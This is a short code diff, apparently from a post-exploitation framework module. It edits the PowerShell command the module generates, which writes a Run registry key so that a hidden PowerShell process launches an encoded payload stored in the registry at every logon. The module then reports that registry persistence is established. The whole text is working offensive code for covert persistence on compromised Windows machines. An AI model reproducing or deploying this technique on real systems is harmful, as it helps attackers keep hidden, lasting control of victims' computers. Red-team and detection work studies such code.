@@ -199,7 +199,7 @@ class Module:
             locationString = "$((gp "+path+" "+name+")."+name+")"
 
 
-        script += "$null=Set-ItemProperty -Force -Path HKLM:Software\\Microsoft\Windows\\CurrentVersion\\Run\\ -Name "+keyName+" -Value '\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"start -Win Hidden -A \"-enc "+locationString+"\" powershell\"';"
+        script += "$null=Set-ItemProperty -Force -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ -Name "+keyName+" -Value '\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x="+locationString+";powershell -Win Hidden -enc $x\"';"
 
         script += "'Registry persistence established "+statusMsg+"'"
 
